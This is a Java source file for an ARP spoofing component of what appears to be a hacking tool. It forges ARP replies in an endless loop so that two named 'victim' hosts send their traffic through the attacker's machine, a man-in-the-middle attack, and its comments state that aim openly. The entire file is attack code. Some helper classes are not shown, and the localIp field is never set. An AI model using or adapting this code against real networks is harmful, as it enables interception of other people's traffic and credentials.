package com.izoman.hcktool.expert;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * Created by umuts on 31/05/2017.
 */

public class ARPSpoof extends Thread {
    private static HashMap<String, String> ip_mac_list;
    private static ArrayList<String> ips_to_explore;

    private static jpcap.NetworkInterface device;

    private static String localIp;
    private static String victimAip;
    private static String victimBip;

    private boolean isARPspoof;
    private Sender middle_sender;

    public ARPSpoof(jpcap.NetworkInterface mydevice, ArrayList<String> in) {
        device = mydevice;
        isARPspoof = false;

        victimAip = in.get(0);
        victimBip = in.get(1);
    }

    public void setMacList(HashMap<String, String> in) {
        this.ip_mac_list = in;
    }

    public void setSender(Sender sd) {
        this.middle_sender = sd;
    }

    public void setARPspoof(boolean value) {
        this.isARPspoof = value;
    }

    public void run() {
        System.out.println("[Channel-Agent] Victim A, ip: " + victimAip + ", mac: " + ip_mac_list.get(victimAip));
        System.out.println("[Channel-Agent] Victim B, ip: " + victimBip + ", mac: " + ip_mac_list.get(victimBip));

        ARPPkt fakeA = new ARPPkt(null);
        ARPPkt fakeB = new ARPPkt(null);
        ARPPkt fakeme = new ARPPkt(null);

        try {
            fakeme.buildDevice("fakyo", "ihniwidyo", "fakyo", "fakeyo", Utils.calculate_mac(ip_mac_list.get(victimBip)),
                    localIp, Utils.__get_inet4(device).subnet.toString().split("/")[1]);
            /*
             * now we will create two fake devices to arp poison the to victims
			 * giving them my mac address so their traffic will come to me
			 */

            fakeA.buildDevice("fak0", "ihniwid", "fak0", "fake", device.mac_address, victimAip,
                    Utils.__get_inet4(device).subnet.toString().split("/")[1]);
            fakeB.buildDevice("fak1", "ihniwid1", "fak1", "fake1", device.mac_address, victimBip,
                    Utils.__get_inet4(device).subnet.toString().split("/")[1]);
        } catch (Exception e) {
            e.printStackTrace();
        }

        while (true) {
            try {
                // spoof the two victims my mac address(provide a fake one)
                // check again may it is not needed

                if (this.isARPspoof) {
                    this.middle_sender.send(fakeme.build_reply_packet(victimAip,
                            ip_mac_list.get(victimAip), device.mac_address));
                    this.middle_sender.send(fakeme.build_reply_packet(victimBip,
                            ip_mac_list.get(victimBip), device.mac_address));

					/* and now A spoofs B and B spoofs A */
                    this.middle_sender
                            .send(fakeA.build_reply_packet(victimBip, ip_mac_list.get(victimBip), device.mac_address));
                    this.middle_sender
                            .send(fakeB.build_reply_packet(victimAip, ip_mac_list.get(victimAip), device.mac_address));
                }

                // sleep a little
                Thread.sleep(500);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
